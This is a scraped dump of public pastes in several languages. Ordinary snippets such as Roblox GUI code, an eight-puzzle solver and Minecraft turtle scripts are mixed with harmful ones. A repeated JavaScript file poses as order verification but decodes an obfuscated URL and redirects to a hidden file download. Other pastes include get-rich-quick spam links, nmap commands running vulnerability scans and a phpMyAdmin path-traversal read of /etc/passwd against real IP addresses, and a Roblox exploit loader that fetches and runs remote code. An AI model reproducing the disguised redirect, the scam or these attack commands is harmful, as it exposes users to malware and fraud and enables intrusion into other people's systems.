id,title,username,language,date,content
mQUNNtrb,Make $1000 15-MINUTES  (BEGINNER) GM,ogkuki88,JavaScript,Tuesday 22nd of April 2025 01:03:46 PM CDT," 
Pdf https://tinyurl.com/privguidee


0gJeee9OSH
"
bvd7Bp5m,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 12:59:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31560/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FqtsxNwS,nmap commands Astranmap (ipmapping),RebelRose,Bash,Tuesday 22nd of April 2025 12:56:11 PM CDT,"Astranmap nmap builds commands ........
.................

sudo nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged

https://github.com/andrewjkerr/security-cheatsheets/blob/master/nmap

https://github.com/screetsec/Dracnmap/blob/master/dracnmap-v2.2.sh

https://github.com/paralax/ObsidianSailboat

https://github.com/phx/cvescan

pkg upgrade
pkg update
pkg install git
pkg install python
pkg install nmap
git clone https://github.com/mishakorzik/MyNmap
pip3 install requests
cd MyNmap
python nmap.py

https://null-byte.wonderhowto.com/how-to/hack-like-pro-advanced-nmap-for-reconnaissance-0151619/

https://github.com/Hellfire13666/d9scan

nmap -sS 192.168.89.191 -oN
nmap -sU --reason 192.168.89.191
192.168.89.191
nmap -sS 192.168.89.191 -oN portscan
nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged
nmap -p80 --script http-phpmyadmin-dir-traversal --script-args=""dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'"" 102.89.83.24

nmap -A -sVC 102.89.83.24 --script=vuln -vvv  --unprivileged
sudo nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged
nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged
nmap -p80 --script http-phpmyadmin-dir-traversal --script-args=""dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'"" 102.89.83.24
nmap -A -sVC 102.89.83.24 --script=vuln -vvv -Pn
nmap --script ftp-proftpd-backdoor -p 21
nmap -A -sVC 102.89.83.24 --script=vuln -vvv -Pn
nmap -sV --script http-coldfusion-subzero
nmap -A --badsum -r
Nmap -A -sVC 102.89.83.24 --script=vuln -vvv
Nmap -A -sVC 102.0.0.0 --script=vuln -vvv
nmap -A --badsum -r
nmap --script ftp-vsftpd-backdoor -p 21
nmap -A -r  144.91.111.50
144.91.111.50
nmap --unprivileged

cat portscan.txt


mkdir astranmap
cd astranmap
ls -a
nano astranmap 
chmod +x astranmap.sh
 ./astranmap.sh

"
TbuF0b1U,EARN $900 INSTANTLY 2025 2T,ogkuki88,JavaScript,Tuesday 22nd of April 2025 12:54:28 PM CDT," 
Pdf https://tinyurl.com/privguidee


3yIqkoEg1I
"
e0ggL7H0,Make $1000 15-MINUTES (BEGINNER) XU,ogkuki88,JavaScript,Tuesday 22nd of April 2025 12:45:10 PM CDT," 
Pdf https://tinyurl.com/privguidee


USnKdBJxhW
"
NZVDngpp,Untitled,dentira,JavaScript,Tuesday 22nd of April 2025 12:43:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79992/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BHnwqryi,map,Koong_Ding,JSON,Tuesday 22nd of April 2025 12:35:59 PM CDT,"Crime City.,
Outlaw Oasis.,
Shiny Shafts.,
Lonewolf Lair.,
Rett i Ett Svarte Markedet.,
Bak Demon Dojo Fjelle (duo).,
Whiffy Wharf.,
Flooded Frogs.,
Magic Mosses.,
Pumped Power.,
Demon.s Dojo.,
Brutal Boxcars.,
Foxy Floodgate.,
Seaport City.,
Shining Span.,
Shogun.s Solitude.,
Canyon Crossing.,
Masked Meadows.,
Hopeful Heights.,
Kappa Kappa Factory.,
Bak Canyon fjellet (duo).,
Yngste Personen Skal Velge.,"
b9Ue4vGm,EARN $900 INSTANTLY 2025 2T,afowlown15,JavaScript,Tuesday 22nd of April 2025 12:35:48 PM CDT," 
Pdf https://tinyurl.com/privguidee


PkDzQPueB7
"
epGQfQeW,First OneLine install,RebelRose,Bash,Tuesday 22nd of April 2025 12:32:17 PM CDT,"xpip install -U 'xonsh[full]'

in the xonsh shell type this

pip install xontrib-autojump

pkg install tcsh

pip install xonsh

pkg install beanshell

proot-distro login 

pkg install photon-rss

pkg install findomainn
 
pkg install whois 

 
pip install holehe

 
pip install arachnid-spider
 
pip install masto

 
pip install social-analyzer
 
pip install hashtray

 
pip install funny-words
 
pip3 install linkchecker
 
pip3 install r3con1z3r

 
pip install oxdork

 
apt install cmatrix

 
apt install crawl

 
pip3 install --upgrade netizenship

 
pip3 install -U search4

 
pip install scrapy

 
apt install exiftool


pip install MetaDetective

 
pip install linkook

 
apt install rustscan
 

pkg install photon-rss

 
npm install -g tunnelmole
 

pip install nexfil
  

pip install phoneintel
 

pip install dnstwist
 

pip install ignorant
 

pip3 install username_generator
 
apt install rustscan

 
pip install phoneintel

 
pip3 install TUIFIManager --upgrade
  

apt install lazygit

pkg install busybox

pkg install nodejs
pkg install nodejs-lts


pip install badurls


pip install socialscan


pkg install grep


 "
uBM0URct,Products.js,dentira,JavaScript,Tuesday 22nd of April 2025 12:28:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76634/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YrT18w56,Make $1000 15-MINUTES  (BEGINNER) GM,faxtel544,JavaScript,Tuesday 22nd of April 2025 12:26:16 PM CDT," 
Pdf https://tinyurl.com/privguidee


dKIRYKDgUq
"
ZB7143fr,Click GUI,Parallaxox,Lua,Tuesday 22nd of April 2025 12:23:51 PM CDT,"--https://youtu.be/j5h2DvXeHEU
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""ScreenGui""
screenGui.Parent = playerGui

local clickButton = Instance.new(""TextButton"")
clickButton.Size = UDim2.new(0.2, 0, 0.1, 0)
clickButton.Position = UDim2.new(0.02, 0, 0.45, 0)
clickButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
clickButton.TextColor3 = Color3.fromRGB(255, 255, 255)
clickButton.Font = Enum.Font.SourceSansBold
clickButton.TextSize = 24
clickButton.Text = ""Click Me""
clickButton.Parent = screenGui

local countLabel = Instance.new(""TextLabel"")
countLabel.Size = UDim2.new(0.2, 0, 0.08, 0)
countLabel.Position = UDim2.new(0.02, 0, 0.35, 0)
countLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
countLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
countLabel.Font = Enum.Font.SourceSansBold
countLabel.TextSize = 24
countLabel.Text = ""Clicks: 0""
countLabel.Parent = screenGui

local clickCount = 0

local function updateCounter()
	countLabel.Text = ""Clicks: "" .. clickCount
end

clickButton.MouseButton1Click:Connect(function()
	clickCount = clickCount + 1
	updateCounter()
end)
"
WsXQX3wd,EARN $900 INSTANTLY 2025 2T,faxtel544,JavaScript,Tuesday 22nd of April 2025 12:16:52 PM CDT," 
Pdf https://tinyurl.com/privguidee


TYcVlPnSwF
"
uNYqEpSZ,Order.js,dentira,JavaScript,Tuesday 22nd of April 2025 12:12:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25435/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SxHQnY2Y,Make $1000 15-MINUTES (BEGINNER) XU,faxtel544,JavaScript,Tuesday 22nd of April 2025 12:07:38 PM CDT," 
Pdf https://tinyurl.com/privguidee


XqEveOhD4i
"
pjjDD1h6,Untitled,RAIYANBEXON,JSON,Tuesday 22nd of April 2025 12:00:00 PM CDT,"[
  {""username"": ""raiyan"", ""password"": ""1""},
  {""username"": ""raiyan"", ""password"": ""1""}
]"
ywEUkrdn,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 11:56:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9apJTRWa,Untitled,dentira,JavaScript,Tuesday 22nd of April 2025 11:41:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/56559/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Edkat6dq,BGSI,IWannaDieAsWell,Lua,Tuesday 22nd of April 2025 11:33:52 AM CDT,"-- Please note that this is the original script. Any other script claiming to be IdiotHub is fake and may have a trade stealer. Stay Safe & Happy Exploting!

loadstring(game:HttpGet(""https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua""))()"
eds4WaZp,cook.lua,hoodedperson,Lua,Tuesday 22nd of April 2025 11:27:27 AM CDT,"local whereWall = nil
local curWall = nil
local blockToWall = {
  [""minecraft:stripped_oak_log""]=0,
  [""minecraft:oak_log""]=1,
  [""minecraft:bricks""]=2,
}
while whereWall == nil or curWall == nil do
  local s,b = turtle.inspect()
  if b.name == ""minecraft:stripped_oak_log"" or b.name == ""minecraft:oak_log"" or b.name == ""minecraft:bricks"" then
    whereWall = 0
    curWall = blockToWall[b.name]
    break
  else
    turtle.turnLeft()
  end
  
end
print(""Found wall: "", curWall)

function turnLeft()
  turtle.turnLeft()
  whereWall = (whereWall - 1) % 4
end
function turnRight()
  turtle.turnRight()
  whereWall = (whereWall + 1) % 4
end
function forward() 
  if whereWall % 2 == 0 then
    return false, ""may not escape 2d working area or run into wall""
  end
  
  local s,r = turtle.forward()
  if not s then
    return false, r
  end
  if whereWall == 1 then
    curWall = (curWall + 1) % 3
    return true
  elseif whereWall == 3 then
    curWall = (curWall - 1) % 3
    return true
  end
end

function goWall(wall)
  if curWall ~= wall then
    dist = wall - curWall
    if dist > 0 and whereWall ~= 1 then
      while whereWall ~= 1 do 
        if whereWall > 1 then 
          turnLeft()
        else
          turnRight() 
        end
      end
    elseif dist < 0 and whereWall ~= 3 then 
      while whereWall ~= 3 do 
        if whereWall < 1 then 
          turnLeft()
        else
          turnRight() 
        end
      end
    end
    dist = math.abs(dist)
    for i=1,dist do
      forward()
    end
  end
end

function cabinet()
  goWall(2)
end

cabinet()

while true do
  local success, block = turtle.inspectDown()
  
end"
XYhZFBjd,Products.js,dentira,JavaScript,Tuesday 22nd of April 2025 11:25:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11603/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZWwLTbix,Order.js,dentira,JavaScript,Tuesday 22nd of April 2025 11:10:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85548/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2bA02jLH,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 10:54:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42693/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CeSqGH8C,Untitled,dentira,JavaScript,Tuesday 22nd of April 2025 10:39:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50282/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KzQexUym,八数码难题 参考代码,Dmaxiya,C++,Tuesday 22nd of April 2025 10:27:50 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
const string t = ""123804765"";
const int dir[4][2] = {
    {-1, 0}, {1, 0}, {0, 1}, {0, -1}
};
string s;
queue<pair<string, int>> que;
map<string, int> step;
map<string, int>::iterator it;

int id(int x, int y) {
    return x * 3 + y;
}

bool in(int x, int y) {
    return x >= 0 && x < 3 && y >= 0 && y < 3;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    cin >> s;
    que.push({s, s.find(""0"")});
    step[s] = 0;
    while (!que.empty()) {
        pair<string, int> tmp = que.front();
        que.pop();
        if (tmp.first == t) {
            cout << step[tmp.first] << endl;
            return 0;
        }
        int d = step[tmp.first];
        int x = tmp.second / 3;
        int y = tmp.second % 3;
        for (int i = 0; i < 4; ++i) {
            int xx = x + dir[i][0];
            int yy = y + dir[i][1];
            if (!in(xx, yy)) {
                continue;
            }
            swap(tmp.first[id(xx, yy)], tmp.first[tmp.second]);
            it = step.find(tmp.first);
            if (it == step.end()) {
                step[tmp.first] = d + 1;
                que.push({tmp.first, id(xx, yy)});
            }
            swap(tmp.first[id(xx, yy)], tmp.first[tmp.second]);
        }
    }

    return 0;
}
"
fNsTKfkY,Products.js,dentira,JavaScript,Tuesday 22nd of April 2025 10:24:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19341/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B1MhmdVE,Order.js,dentira,JavaScript,Tuesday 22nd of April 2025 10:08:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/62657/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yJEMqGhi,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 09:53:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55588/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5LuQJVN1,term.lua,Xmann1,Lua,Tuesday 22nd of April 2025 09:50:28 AM CDT,"local chest = peripheral.wrap(""front"")
local query = nil

rednet.open(""bottom"")

function io()
  if query == nil then
    return
  end

  -- Pipe matching items towards player
  local chest_items = chest.list()
  if chest_items ~= nil then
    for slot, item in pairs(chest_items) do
      if string.find(item.name, query) then
        turtle.select(1)
        turtle.suck()
      end

      break
    end
  end
end

function empty_garbage()
  -- Pipe non-matching items away from player
  for i=1, 16 do
    turtle.select(i)

    itemDetail = turtle.getItemDetail()

    if query == nil or (itemDetail ~= nil and not string.find(itemDetail.name, query)) then
      turtle.drop()
    end
  end
  
  turtle.select(1)
end

local query_input = """"

local width, height = term.getSize()

while true do
  term.setCursorPos(1, height)
  term.clearLine()
  term.write(""> "" .. query_input)

  os.startTimer(1)

  local eventData = { os.pullEvent() }
  local event = eventData[1]

  if event == ""key"" then
    local key = eventData[2]

    if key == 257 then
      if string.len(query_input) > 0 then
        query = query_input

        rednet.broadcast(query)

        empty_garbage()
        query_input = """"
      end
    elseif key == 259 then
      query_input = string.sub(query_input, 1, -2)
    elseif key >= 39 and key <= 126 then
      query_input = query_input .. string.char(key)
    end
  end

  io();
end

"
xRV9Zn3b,Untitled,dentira,JavaScript,Tuesday 22nd of April 2025 09:38:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95666/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
x3f6xQPb,Instant Winners Tab paging - custom number of entries per page,wpgenie,PHP,Tuesday 22nd of April 2025 09:31:48 AM CDT,"/**
 * Custom number of instant winners per page in instant winners TAB
 */
add_filter( 'woocommerce_lottery_instant_winners_per_page', 'woocommerce_lottery_instant_winners_per_page_custom', 100 );

function woocommerce_lottery_instant_winners_per_page_custom() {
    
    return 30;
}"
7VvtzP8N,[NP] Movie Collection,dzocesrce,Java,Tuesday 22nd of April 2025 09:30:29 AM CDT,"import java.util.*;
import java.util.Arrays;
import java.util.List;
import java.util.*;
import java.util.stream.Collectors;

class MoviesList {
    List<Movie> movies;

    public MoviesList() {
        this.movies = new ArrayList<>();
    }

    public void addMovie(String title, int[] ratings) {
        movies.add(new Movie(title, ratings));
    }

    public List<Movie> top10ByAvgRating() {
        return movies.stream()
                .sorted(Comparator.comparing(Movie::getAverageRating).reversed()
                        .thenComparing(Movie::getTitle))
                .limit(10)
                .collect(Collectors.toList());
    }

    private double getMovieCoef(Movie m, int max_ratings_count){
        return m.getAverageRating()*m.getRatings().length/max_ratings_count;
    }

    public List<Movie> top10ByRatingCoef() {
        int max_ratings_count= movies.stream().map(i->i.getRatings().length).max(Integer::max).get();
